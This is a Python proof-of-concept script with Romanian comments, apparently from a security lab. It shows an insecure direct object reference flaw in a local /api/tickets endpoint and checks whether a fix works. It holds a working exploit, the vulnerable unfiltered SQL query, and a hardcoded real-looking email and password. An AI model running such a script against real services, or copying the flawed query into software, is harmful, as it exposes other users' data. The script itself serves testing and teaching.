#!/usr/bin/env python3
"""
Insecure Direct Object Reference pe /api/tickets
Demonstreaza ca orice user logat poate vedea tichetele TUTUROR
utilizatorilor, nu doar pe ale sale.
"""

import requests

BASE_URL = "http://localhost:5000"

EMAIL    = "cosmin203@gmail.com"
PASSWORD = "Cosmin28#"

print("=" * 60)
print("PoC IDOR - /api/tickets returneaza toate tichetele")
print("=" * 60)

print(f"\n Login ca user normal: {EMAIL}")
r = requests.post(f"{BASE_URL}/api/login", json={"email": EMAIL, "password": PASSWORD})
if r.status_code != 200:
    print(f"    Login esuat ({r.status_code}). Continuam demonstratia conceptuala.")
    token = "DEMO_TOKEN"
else:
    # Magie Universala: ia token-ul din JSON (pt V1) sau din Cookie (pt V2)
    token = r.json().get("token")
    if not token:
        token = r.cookies.get("session_id")
        
    print(f"    Login OK. Token: {str(token)[:40]}...")

# --- Pasul 2: Acces /api/tickets fara filtrare ---
print(f"\n[2] GET /api/tickets (ar trebui sa vada DOAR propriile tichete)")

# Trimitem "cheia" pe ambele cai pentru a suporta ambele versiuni de server
headers = {"Authorization": f"Bearer {token}"}
cookies = {"session_id": token} 

r2 = requests.get(f"{BASE_URL}/api/tickets", headers=headers, cookies=cookies)
print(f"    Status: {r2.status_code}")

if r2.status_code == 200:
    tickets = r2.json()
    print(f"    Tichete returnate: {len(tickets)}")
    print()
    
    if len(tickets) > 1:
        print("    Continut (inclusiv tichete apartinand ALTOR useri):")
        for t in tickets[:5]:
            print(f"    -> {t}")
        print("\n    [!] VULNERABIL: Userul vede datele TUTUROR utilizatorilor!")
    else:
        print("    Continut (doar tichetele proprii):")
        for t in tickets:
            print(f"    -> {t}")
        print("\n    [✓ SECURIZAT] Vulnerabilitatea IDOR a fost remediata! Userul nu mai vede tichetele altora.")
else:
    print("    Raspuns:", r2.text[:200])

print()
print("Linia vulnerabila in cod:")
print('    cur.execute("SELECT * FROM tickets")  # <-- fara WHERE owner_id = current_user')